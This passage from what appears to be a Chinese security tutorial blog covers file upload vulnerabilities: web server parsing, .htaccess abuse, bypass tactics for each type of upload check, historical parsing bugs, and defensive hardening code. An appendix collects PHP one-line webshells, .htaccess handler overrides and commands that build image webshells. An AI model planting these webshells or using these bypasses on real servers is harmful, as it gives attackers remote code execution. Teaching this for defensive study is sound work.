+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户访问文件 → Web Server 接收请求 → </span><br><span class="line">判断文件类型 → </span><br><span class="line">    ├─ 静态文件：直接返回内容</span><br><span class="line">    └─ 脚本文件：交给解析器（如 PHP）执行</span><br></pre></td></tr></table></figure>
+<h3 id="32-为什么上传成功但无法执行"><a class="markdownIt-Anchor" href="#32-为什么上传成功但无法执行"></a> 3.2 为什么上传成功但无法执行？</h3>
+<p>可能的原因：</p>
+<ol>
+<li><strong>保存位置</strong>：文件在 Web 根目录之外</li>
+<li><strong>权限问题</strong>：文件没有执行权限</li>
+<li><strong>解析器配置</strong>：服务器不解析该后缀</li>
+<li><strong>中间件配置</strong>：禁止执行上传目录的脚本</li>
+</ol>
+<h3 id="33-htaccessapache-特殊机制"><a class="markdownIt-Anchor" href="#33-htaccessapache-特殊机制"></a> 3.3 .htaccess（Apache 特殊机制）</h3>
+<p><strong>什么是 .htaccess？</strong></p>
+<ul>
+<li>Apache 目录级配置文件</li>
+<li>可改变当前目录的 Web 服务器行为</li>
+</ul>
+<p><strong>常见攻击手法：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 让 .jpg 文件按 PHP 解析</span></span><br><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用 AddHandler</span></span><br><span class="line"><span class="attribute">AddHandler</span> application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+<p><strong>生效条件：</strong></p>
+<ol>
+<li>服务器为 Apache</li>
+<li>Apache 允许 <code>.htaccess</code> 覆盖（<code>AllowOverride All</code>）</li>
+<li>对应 <code>mod_mime</code> 模块已启用</li>
+</ol>
+<p><strong>攻击链路示例：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 上传 .htaccess（内容: AddType application/x-httpd-php .jpg）</span><br><span class="line">2. 上传 shell.jpg（内容: &lt;?php phpinfo(); ?&gt;）</span><br><span class="line">3. 访问 shell.jpg → 服务器按 PHP 解析 → 代码执行</span><br></pre></td></tr></table></figure>
+<hr />
+<h2 id="四-常见问题"><a class="markdownIt-Anchor" href="#四-常见问题"></a> 四、常见问题</h2>
+<h3 id="41-基础概念问题"><a class="markdownIt-Anchor" href="#41-基础概念问题"></a> 4.1 基础概念问题</h3>
+<p><strong>Q: 文件上传漏洞为什么会产生？</strong></p>
+<blockquote>
+<p>因为用户上传的文件被 Web 服务器当作可执行脚本解析执行。根本原因是服务端对用户上传文件缺乏足够的检查和限制。</p>
+</blockquote>
+<p><strong>Q: multipart/form-data 是什么？</strong></p>
+<blockquote>
+<p>HTTP 协议中用于上传文件的编码类型，能将表单数据和文件内容一起发送，浏览器在 <code>&lt;form enctype=&quot;multipart/form-data&quot;&gt;</code> 时使用。</p>
+</blockquote>
+<p><strong>Q: $_FILES 中大概有什么？</strong></p>
+<blockquote>
+<p>name（原始文件名）、type（MIME类型）、size（大小）、tmp_name（临时文件路径）、error（错误码）。</p>
+</blockquote>
+<h3 id="42-检查机制问题"><a class="markdownIt-Anchor" href="#42-检查机制问题"></a> 4.2 检查机制问题</h3>
+<p><strong>Q: Content-Type 为什么不能直接相信？</strong></p>
+<blockquote>
+<p>Content-Type 是客户端在 HTTP 请求头中提交的，攻击者可以用 Burp 等工具随意修改。服务器应该通过检查文件实际内容（如文件头）来判断类型。</p>
+</blockquote>
+<p><strong>Q: 文件后缀和真实文件类型有什么区别？</strong></p>
+<blockquote>
+<ul>
+<li>后缀是文件名的一部分，客户端可随意命名</li>
+<li>真实文件类型由文件内容（二进制数据）决定，通过文件头 Magic Bytes 识别</li>
+<li>例如：<code>shell.jpg</code> 后缀是 jpg，但内容可能是 PHP 代码</li>
+</ul>
+</blockquote>
+<p><strong>Q: 黑名单和白名单有什么区别？</strong></p>
+<blockquote>
+<ul>
+<li><strong>黑名单</strong>：列举不允许的，默认允许所有。需要穷举所有危险情况，容易遗漏。</li>
+<li><strong>白名单</strong>：列举允许的，默认拒绝所有。更安全，但只检查后缀，仍需验证文件内容。</li>
+</ul>
+</blockquote>
+<p><strong>Q: 文件头是什么？</strong></p>
+<blockquote>
+<p>文件开头的若干字节，用于标识文件真实类型。如 JPEG 的文件头是 <code>FF D8 FF E0</code>，PNG 是 <code>89 50 4E 47</code>。</p>
+</blockquote>
+<h3 id="43-利用链问题"><a class="markdownIt-Anchor" href="#43-利用链问题"></a> 4.3 利用链问题</h3>
+<p><strong>Q: 为什么上传成功不代表能够代码执行？</strong></p>
+<blockquote>
+<p>文件能上传只是第一步，还需要：</p>
+<ol>
+<li>文件在 Web 可访问目录</li>
+<li>路径可预测</li>
+<li>Web 服务器能解析执行该文件</li>
+<li>解析器配置正确</li>
+</ol>
+</blockquote>
+<p><strong>Q: Web Server 在整个利用链中起了什么作用？</strong></p>
+<blockquote>
+<p>Web Server 决定文件如何处理：</p>
+<ul>
+<li>静态文件 → 直接返回</li>
+<li>脚本文件 → 交给解析器执行</li>
+<li>配置错误或特殊规则可能导致非脚本文件被解析执行</li>
+</ul>
+</blockquote>
+<p><strong>Q: .htaccess 大概是干什么的？</strong></p>
+<blockquote>
+<p>Apache 的目录级配置文件，可影响当前目录的 Web 行为，如：</p>
+<ul>
+<li>改变文件解析规则</li>
+<li>设置目录访问权限</li>
+<li>URL 重写规则</li>
+</ul>
+</blockquote>
+<p><strong>Q: 图片马为什么通常还需要结合其他漏洞？</strong></p>
+<blockquote>
+<p>图片马虽然包含恶意代码，但 Web 服务器默认只把它当成静态图片返回。需要配合：</p>
+<ul>
+<li>文件包含漏洞（包含图片马）</li>
+<li>解析配置（如 .htaccess）</li>
+<li>服务器解析漏洞</li>
+</ul>
+</blockquote>
+<h3 id="44-防御问题"><a class="markdownIt-Anchor" href="#44-防御问题"></a> 4.4 防御问题</h3>
+<p><strong>Q: 为什么上传目录最好禁止脚本执行？</strong></p>
+<blockquote>
+<p>即使攻击者上传了恶意脚本，如果目录禁止执行，也无法触发代码执行。这是纵深防御的重要措施。</p>
+</blockquote>
+<p><strong>Q: 为什么不能只依靠某一道过滤规则？</strong></p>
+<blockquote>
+<p>文件上传是复杂过程，需要通过多层检查：</p>
+<ol>
+<li>扩展名检查（白名单优先）</li>
+<li>文件头检查（验证真实类型）</li>
+<li>内容检查（对图片进行重采样）</li>
+<li>存储安全（重命名、禁止执行）</li>
+<li>访问控制</li>
+</ol>
+</blockquote>
+<hr />
+<h2 id="五-实战总结"><a class="markdownIt-Anchor" href="#五-实战总结"></a> 五、实战总结</h2>
+<h3 id="51-基础上传利用步骤"><a class="markdownIt-Anchor" href="#51-基础上传利用步骤"></a> 5.1 基础上传利用步骤</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 构造恶意文件（如 shell.php）</span><br><span class="line">2. 通过 Burp 观察上传请求</span><br><span class="line">3. 绕过各种检查机制</span><br><span class="line">4. 找到上传后的文件路径</span><br><span class="line">5. 访问文件，触发代码执行</span><br><span class="line">6. 获取 WebShell 权限</span><br></pre></td></tr></table></figure>
+<h3 id="52-不同检查的应对策略"><a class="markdownIt-Anchor" href="#52-不同检查的应对策略"></a> 5.2 不同检查的应对策略</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">检查层</th>
+<th style="text-align:left">应对方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">前端 JS</td>
+<td style="text-align:left">禁用 JS 或直接修改请求</td>
+</tr>
+<tr>
+<td style="text-align:left">Content-Type</td>
+<td style="text-align:left">修改为允许的 MIME 类型</td>
+</tr>
+<tr>
+<td style="text-align:left">黑名单</td>
+<td style="text-align:left">尝试其他解析后缀、大小写、双写、利用配置差异</td>
+</tr>
+<tr>
+<td style="text-align:left">白名单</td>
+<td style="text-align:left">配合文件内容检查绕过（图片马 + 解析器漏洞）</td>
+</tr>
+<tr>
+<td style="text-align:left">文件内容</td>
+<td style="text-align:left">构造合法的图片马</td>
+</tr>
+<tr>
+<td style="text-align:left">.htaccess</td>
+<td style="text-align:left">上传修改解析规则的 .htaccess</td>
+</tr>
+</tbody>
+</table>
+<h3 id="53-关键排查思路"><a class="markdownIt-Anchor" href="#53-关键排查思路"></a> 5.3 关键排查思路</h3>
+<p>当上传不成功时，按顺序排查：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 前端检查？ → 否 → 检查后端响应</span><br><span class="line">2. Content-Type 检查？ → 否 → 检查错误信息</span><br><span class="line">3. 后缀名检查？ → 否 → 分析黑/白名单</span><br><span class="line">4. 文件内容检查？ → 否 → 尝试图片马</span><br><span class="line">5. 保存成功？ → 否 → 检查目录权限</span><br><span class="line">6. 可以访问？ → 否 → 确认保存路径</span><br><span class="line">7. 可以执行？ → 否 → 分析解析器配置</span><br></pre></td></tr></table></figure>
+<h2 id="六-拓展内容"><a class="markdownIt-Anchor" href="#六-拓展内容"></a> 六、拓展内容</h2>
+<h3 id="61-其他绕过技巧"><a class="markdownIt-Anchor" href="#61-其他绕过技巧"></a> 6.1 其他绕过技巧</h3>
+<p><strong>1. 文件名解析差异</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows 特性</span></span><br><span class="line">shell.php.      <span class="comment"># 末尾点号会被忽略</span></span><br><span class="line">shell.php::<span class="variable">$DATA</span> <span class="comment"># NTFS 数据流</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 路径截断（旧版本 PHP）</span></span><br><span class="line">shell.php%00.jpg  <span class="comment"># %00 截断后面的内容</span></span><br></pre></td></tr></table></figure>
+<p><strong>2. 条件竞争（Race Condition）</strong></p>
+<ul>
+<li>检查后移动前的极短时间窗口</li>
+<li>利用并发请求在移动前访问临时文件</li>
+</ul>
+<p><strong>3. Web 服务器历史解析漏洞</strong></p>
+<ul>
+<li>Apache 2.0.x：<code>shell.php.rar</code> 会解析为 PHP</li>
+<li>Nginx 配置不当：<code>/upload/avatar.jpg/1.php</code> 会解析 PHP</li>
+<li>IIS 6.0：<code>shell.asp;.jpg</code> 按 ASP 解析</li>
+</ul>
+<p><strong>4. 图片处理库漏洞</strong></p>
+<ul>
+<li>ImageMagick 的 CVE-2016-3714（ImageTragick）</li>
+<li>GD 库的某些漏洞</li>
+</ul>
+<h3 id="62-防御加固方案"><a class="markdownIt-Anchor" href="#62-防御加固方案"></a> 6.2 防御加固方案</h3>
+<p><strong>1. 文件存储安全</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重命名文件</span></span><br><span class="line"><span class="variable">$new_name</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>() . <span class="title function_ invoke__">time</span>()) . <span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;/var/www/uploads/&#x27;</span> . <span class="variable">$new_name</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查真实类型</span></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="variable">$mime</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$tmp_name</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 白名单过滤</span></span><br><span class="line"><span class="variable">$allowed</span> = [<span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>, <span class="string">&#x27;image/gif&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid file type&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>2. 权限与配置</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Apache - 上传目录禁止执行</span></span><br><span class="line"><span class="section">&lt;Directory /var/www/uploads&gt;</span></span><br><span class="line">    <span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br><span class="line">    <span class="attribute">AddHandler</span> default-handler .php .php5 .phtml</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Nginx - 禁止访问 PHP 文件</span></span><br><span class="line"><span class="attribute">location</span> /uploads/ &#123;</span><br><span class="line">    <span class="attribute">location</span> ~ .*\.php$ &#123;</span><br><span class="line">        <span class="attribute">deny</span> <span class="literal">all</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>3. 内容深度检查</strong></p>
+<ul>
+<li>对图片进行重新采样（重新生成图片）</li>
+<li>使用杀毒软件扫描上传文件</li>
+<li>对文件内容进行严格过滤</li>
+</ul>
+<h3 id="63-进阶学习方向"><a class="markdownIt-Anchor" href="#63-进阶学习方向"></a> 6.3 进阶学习方向</h3>
+<ol>
+<li><strong>文件包含结合</strong>：配合 LFI 使用图片马</li>
+<li><strong>其他语言 WebShell</strong>：ASP、JSP、Node.js 等</li>
+<li><strong>特殊协议</strong>：phar:// 反序列化</li>
+<li><strong>RESTful API 上传</strong>：JSON 格式的文件上传</li>
+<li><strong>SSRF 结合</strong>：利用上传功能进行内网探测</li>
+</ol>
+<h3 id="64-快速自检"><a class="markdownIt-Anchor" href="#64-快速自检"></a> 6.4 快速自检</h3>
+<p>完成学习后，请确认能回答：</p>
+<p>完整攻击链的四个步骤是什么？</p>
+<p>为什么上传成功不代表执行成功？</p>
+<p>客户端提交的三个不可信内容是什么？</p>
+<p>Content-Type 检查如何绕过？</p>
+<p>黑名单和白名单的区别？</p>
+<p>图片马为什么需要配合其他漏洞？</p>
+<p>.htaccess 的作用是什么？</p>
+<p>为什么上传目录要禁止脚本执行？</p>
+<p>如何找到上传文件的路径？</p>
+<p>Web Server 在利用链中扮演什么角色？</p>
+<hr />
+<h2 id="附录常用-payload-集合"><a class="markdownIt-Anchor" href="#附录常用-payload-集合"></a> 附录：常用 Payload 集合</h2>
+<p><strong>一句话木马：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>一句话木马变体：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>.htaccess 常用内容：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .jpg</span><br><span class="line"><span class="attribute">AddHandler</span> cgi-script .jpg</span><br><span class="line"><span class="attribute">Options</span> +ExecCGI</span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br></pre></td></tr></table></figure>
+<p><strong>图片马制作：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> &gt;&gt; real_image.jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">copy real_image.jpg + shell.php image_shell.jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 exiftool</span></span><br><span class="line">exiftool -Comment=<span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> image.jpg</span><br></pre></td></tr></table></figure>
+
+    </div>
+    <footer class="article-footer">
+        <blockquote class="article-copyright">
+    <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/08/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">https://cl1ck-t0.github.io/2026/08/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</a></p>
+    
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-08-17 16:44:45</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-08-17 17:27:43</p>
+    <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
+    <span class="icon-creative-commons article-copyright-bg"></span>
+  </blockquote>
+        <div class="share-wrapper">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F08%2F17%2F%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E6%25BC%258F%25E6%25B4%259E%2F&amp;appkey=&amp;title=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="文件上传漏洞">
+      <div class="share-icon icon icon-weibo">
+      </div>
+    </a>
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E&amp;desc=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="文件上传漏洞">
+      <div class="share-icon icon icon-qq">
+      </div>
+    </a>
+    <a href="javascript:;"  title="文件上传漏洞">
+      <div class="share-icon icon icon-weixin">
+          <div id="share-weixin">
+            <div class="share-weixin-dom">
+              <div class="share-weixin-content">
+                <img id="share-weixin-banner"> 
+                <div id="share-weixin-title"></div>
+                <div id="share-weixin-desc"></div>
+              </div>
+              <div class="share-weixin-qrcode">
+                <div class="share-weixin-info">
+                  <div id="share-weixin-author"></div>
+                  <div id="share-weixin-theme">Powered By hexo-theme-reimu</div>
+                </div>
+                <img id="share-weixin-qr" >
+              </div>
+            </div>
+            <div class="share-weixin-canvas"></div>
+          </div>
+      </div>
+    </a>
+</div>
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag" title="web漏洞">web漏洞</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/covers/castorice-purple-3840x2160-22219.jpg" data-sizes="auto" alt="文件包含漏洞详解及利用" class="lazyload">
+        <a href="/2026/08/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%88%A9%E7%94%A8/" aria-label="Prev: 文件包含漏洞详解及利用" title="Prev: 文件包含漏洞详解及利用"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+            文件包含漏洞详解及利用
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/covers/preview.jpg" data-sizes="auto" alt="CSP" class="lazyload">
+      <a href="/2026/08/15/CSP/" aria-label="Next: CSP"  title="Next: CSP"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          CSP
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        &nbsp;
+      Cl1ck-t0
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        67.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:11
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> 文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.1 文件上传漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-http-%E4%B8%8A%E4%BC%A0%E8%AF%B7%E6%B1%82%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 1.2 HTTP 上传请求基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-%E4%B8%89%E4%B8%AA%E5%85%B3%E9%94%AE%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 1.3 三个关键概念</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%B8%B8%E8%A7%81%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、常见检查机制与绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E5%89%8D%E7%AB%AF%E6%A3%80%E6%9F%A5javascript"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 2.1 前端检查（JavaScript）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-content-type-%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2.2 Content-Type 检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 2.3 文件后缀检查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">1.2.3.1.</span> <span class="toc-text"> 黑名单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">1.2.3.2.</span> <span class="toc-text"> 白名单</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 2.4 文件内容检查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、Web 服务器解析机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#31-%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 3.1 解析流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%E4%BD%86%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 3.2 为什么上传成功但无法执行？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-htaccessapache-%E7%89%B9%E6%AE%8A%E6%9C%BA%E5%88%B6"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.3 .htaccess（Apache 特殊机制）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text"> 四、常见问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#41-%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 4.1 基础概念问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 4.2 检查机制问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#43-%E5%88%A9%E7%94%A8%E9%93%BE%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 4.3 利用链问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 